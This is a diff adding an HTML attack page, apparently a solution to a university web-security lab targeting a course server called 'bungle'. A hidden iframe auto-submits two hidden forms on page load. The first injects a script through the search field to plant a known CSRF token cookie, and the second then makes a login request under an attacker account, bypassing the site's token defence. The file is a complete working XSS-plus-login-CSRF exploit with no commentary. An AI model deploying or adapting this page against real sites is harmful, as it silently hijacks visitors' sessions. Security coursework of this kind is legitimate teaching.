@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Mysterious Site</title>
+</head>
+<body>
+    <div id="hidden_form">
+        <iframe name="nada" src="http://bungle-cs461.csl.illinois.edu" height="0" width="0" style="border:none" onload="submitForm()"></iframe>
+        <form name="set_cookie" target="nada" action="http://bungle-cs461.csl.illinois.edu/search" method="get">
+            <input type="hidden" name="csrfdefense" value="1">
+            <input type="hidden" name="xssdefense" value="0">
+            <input type="hidden" name="q" value="<script>document.cookie='csrf_token=1234567812345678'</script>">
+        </form>
+        <form name="attacker_login" target="nada" action="http://bungle-cs461.csl.illinois.edu/login" method="post">
+            <input type="hidden" name="csrfdefense" value="1">
+            <input type="hidden" name="xssdefense" value="0">
+            <input type="hidden" name="username" value="attacker">
+            <input type="hidden" name="password" value="l33th4x">
+            <input type="hidden" name="csrf_token" value="1234567812345678">
+        </form>
+    </div>
+    <script type="text/javascript">
+        var cnt = 0;
+        function submitForm() {
+            if (cnt == 0) {
+                document.set_cookie.submit();
+            } else if (cnt == 1) {
+                document.attacker_login.submit();
+            }
+            cnt++;
+        }
+    </script>
+</body>
+</html>
